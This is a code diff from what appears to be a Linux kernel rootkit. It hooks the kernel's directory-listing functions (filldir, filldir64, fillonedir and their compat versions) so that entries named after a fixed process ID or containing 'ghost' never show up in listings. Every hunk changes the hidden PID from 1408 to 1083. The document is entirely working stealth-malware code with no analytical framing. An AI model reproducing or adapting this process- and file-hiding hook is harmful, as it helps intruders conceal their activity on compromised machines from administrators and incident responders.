@@ -157,7 +157,7 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 	find_pid_hide();
 	pid = simple_strtol(name, &endp, 10);
 	//printk("pid:%ld", pid);
-	if (pid != 1408 && !strstr(name, "ghost"))
+	if (pid != 1083 && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -171,7 +171,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 	find_pid_hide();
 	pid = simple_strtol(name, &endp, 10);
 	//printk("pid:%ld", pid);
-	if (pid != 1408 && !strstr(name, "ghost"))
+	if (pid != 1083 && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -186,7 +186,7 @@ static int khook_filldir64(void *__buf, const char *name, int namlen,
 	find_pid_hide();
 	pid = simple_strtol(name, &endp, 10);
 	//printk("pid:%ld", pid);
-	if (pid != 1408 && !strstr(name, "ghost"))
+	if (pid != 1083 && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -201,7 +201,7 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 	find_pid_hide();
 	pid = simple_strtol(name, &endp, 10);
 	//printk("pid:%ld", pid);
-	if (pid != 1408 && !strstr(name, "ghost"))
+	if (pid != 1083 && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -217,7 +217,7 @@ static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 	find_pid_hide();
 	pid = simple_strtol(name, &endp, 10);
 	//printk("pid:%ld", pid);
-	if (pid != 1408 && !strstr(name, "ghost"))
+	if (pid != 1083 && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
